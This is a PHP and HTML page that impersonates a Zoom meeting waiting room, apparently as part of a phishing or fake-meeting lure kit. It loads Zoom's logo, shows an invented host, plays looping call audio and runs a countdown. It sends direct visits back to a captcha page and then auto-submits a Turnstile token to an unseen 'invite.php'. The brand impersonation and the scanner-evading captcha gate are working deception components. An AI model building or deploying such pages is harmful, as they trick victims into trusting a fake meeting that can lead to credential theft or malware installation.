<?php
// 🛡️ Turnstile Verification Fallback
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = $_POST['cf-turnstile-response'] ?? '';
} else {
    // Redirect back to captcha if accessed directly via GET
    header("Location: ./Video_Call/index.php");
    exit;
}
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset='utf-8'>
  <meta http-equiv='X-UA-Compatible' content='IE=edge'>
  <title>Zoom Meeting</title>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <link rel='stylesheet' type='text/css' media='screen' href='./css/style.css'>
  <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">

  <style>
    /* ===== ZOOM MEETING UI ===== */
    * {
      box-sizing: border-box;
    }

    body {
      background: #1a1a2e !important;
      overflow: hidden;
      margin: 0;
      height: 100vh;
    }

    /* Top Meeting Info Bar */
    .meeting-topbar {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 48px;
      background: #1a1a2e;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      z-index: 100;
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }

    .meeting-topbar .meeting-info {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .meeting-topbar .meeting-title {
      color: #e0e0e0;
      font-size: 14px;
      font-weight: 500;
    }

    .meeting-topbar .topbar-actions {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .meeting-topbar .topbar-actions button {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.15);
      color: #ccc;
      font-size: 12px;
      padding: 6px 14px;
      border-radius: 4px;
      cursor: pointer;
    }

    /* Loading / Connecting Screen */
    .loading {
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: #1a1a2e;
    }

    .loading-spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(14, 114, 237, 0.2);
      border-top-color: #0E72ED;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading p {
      margin-top: 24px;
      color: #ccc;
      font-size: 16px;
      font-weight: 500;
    }

    /* Pre-meeting Screen */
    .meeting_page {
      display: none;
      height: 100vh;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: #1a1a2e;
    }

    .pre-meeting-content {
      text-align: center;
      max-width: 600px;
    }

    .status-icon {
      width: 80px;
      height: 80px;
      background: rgba(14, 114, 237, 0.15);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
    }

    .status-icon i {
      font-size: 32px;
      color: #0E72ED;
    }

    .meeting-status h2 {
      color: #e0e0e0;
      font-size: 24px;
      margin: 0 0 12px;
    }

    .participant-preview-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      margin: 20px 0;
    }

    .participant-preview-item img {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid rgba(14, 114, 237, 0.4);
    }

    .participant-preview-item span {
      color: #ccc;
      font-size: 13px;
    }

    .role-badge {
      background: #0E72ED;
      color: white;
      font-size: 10px;
      padding: 2px 8px;
      border-radius: 3px;
      text-transform: uppercase;
    }

    .countdown-timer {
      font-size: 48px;
      font-weight: 700;
      color: #0E72ED;
      margin-top: 20px;
    }

    /* Bottom Control Bar */
    .control-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      height: 64px;
      background: #1a1a2e;
      border-top: 1px solid rgba(255, 255, 255, 0.08);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
    }

    .control-btn {
      color: #ccc;
      background: none;
      border: none;
      text-align: center;
      font-size: 11px;
    }

    .control-btn i {
      display: block;
      font-size: 18px;
      margin-bottom: 4px;
      background: #3a3a52;
      width: 36px;
      height: 36px;
      line-height: 36px;
      border-radius: 50%;
    }
  </style>
</head>

<body class="overpass">

  <div class="meeting-topbar">
    <div class="meeting-info">
      <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo" style="height: 24px;">
      <span class="meeting-title">Zoom Meeting</span>
    </div>
    <div class="topbar-actions">
      <button><i class="fa-solid fa-shield-halved"></i> Security</button>
      <button><i class="fa-solid fa-user-group"></i> 1</button>
    </div>
  </div>

  <audio id="myAudio" autoplay loop>
    <source src="./teams_cut.mp3" type="audio/mpeg">
  </audio>

  <div class="loading">
    <div class="loading-spinner"></div>
    <p>Connecting...</p>
  </div>

  <section class="meeting_page">
    <div class="pre-meeting-content">
      <div class="meeting-status">
        <div class="status-icon">
          <i class="fa-solid fa-clock"></i>
        </div>
        <h2>Waiting for host to start the meeting</h2>
      </div>

      <div class="participant-preview-item">
        <img src="./images/image.png" alt="Sarah Eilart">
        <span>Sarah Eilart</span>
        <span class="role-badge">Host</span>
      </div>

      <div class="countdown-container">
        <p style="color: #888;">Joining meeting in</p>
        <div class="countdown-timer" id="countdownTimer">5</div>
      </div>
    </div>

    <div class="control-bar">
      <div class="control-btn"><i class="fa-solid fa-microphone"></i>Mute</div>
      <div class="control-btn"><i class="fa-solid fa-video"></i>Video</div>
      <div class="control-btn"><i class="fa-solid fa-user-group"></i>Participants</div>
      <div class="control-btn"><i class="fa-solid fa-comment"></i>Chat</div>
    </div>
  </section>

  <form id="inviteForm" method="POST" action="invite.php">
    <input type="hidden" name="cf-turnstile-response" value="<?php echo htmlspecialchars($token); ?>">
  </form>

  <script>
    const metteingpage = document.querySelector(".meeting_page");
    const loadingpage = document.querySelector(".loading");

    setTimeout(() => {
      loadingpage.style.display = "none";
      metteingpage.style.display = "flex";
      startCountdown();
    }, 5000);

    function startCountdown() {
      let countdown = 5;
      const countdownTimer = document.getElementById('countdownTimer');

      const interval = setInterval(() => {
        countdown--;
        countdownTimer.textContent = countdown;

        if (countdown <= 0) {
          clearInterval(interval);
          document.getElementById("inviteForm").submit();
        }
      }, 1000);
    }
  </script>
</body>

</html>
